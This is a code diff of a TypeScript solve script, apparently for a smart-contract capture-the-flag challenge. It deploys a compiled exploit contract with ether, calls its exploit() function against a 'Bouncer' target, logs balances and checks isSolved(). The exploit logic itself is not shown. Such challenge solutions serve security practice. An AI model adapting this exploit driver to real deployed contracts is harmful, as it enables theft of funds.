@@ -45,12 +45,28 @@ export const solve = async (exploiter: Sender, setupAddress: string): Promise<bo
         return false;
     }
     const bytecode = output['contracts']['private/Exploit.sol']['Exploit'].evm.bytecode.object;
-    const exploitContractAddress = await exploiter.deployContract(bytecode+'000000000000000000000000'+setupAddress.slice(2));
+    const exploitContractAddress = 
+        await exploiter.deployContract(bytecode+'000000000000000000000000'+setupAddress.slice(2), {
+            value: '2',
+            unit: 'ether'
+        });
     console.log('private/Exploit.sol', exploitContractAddress);
 
-    const calldata = abi.simpleEncode('solve()');
-    const receipt = await exploiter.callContract(exploitContractAddress, calldata);
-    console.log('call solve() receipt:', receipt);
+    {
+        const balance = await exploiter.viewContract(exploitContractAddress, abi.simpleEncode('viewBouncerBalance()'));
+        console.log('view bouncer balance:', balance);
+    }
+
+    const calldata = abi.simpleEncode('exploit()');
+    const receipt = await exploiter.callContract(exploitContractAddress, calldata, {value: '100', unit: 'ether'});
+    console.log('call exploit() receipt:', receipt);
+    
+    {
+        const balance = await exploiter.viewContract(exploitContractAddress, abi.simpleEncode('viewBouncerBalance()'));
+        console.log('view bouncer balance:', balance);
+    }
+    const balance = await exploiter.viewContract(exploitContractAddress, abi.simpleEncode('viewBalance()'));
+    console.log('view balance:', balance);
 
     const data = abi.simpleEncode('isSolved()');
     const res = await exploiter.viewContract(setupAddress, data)
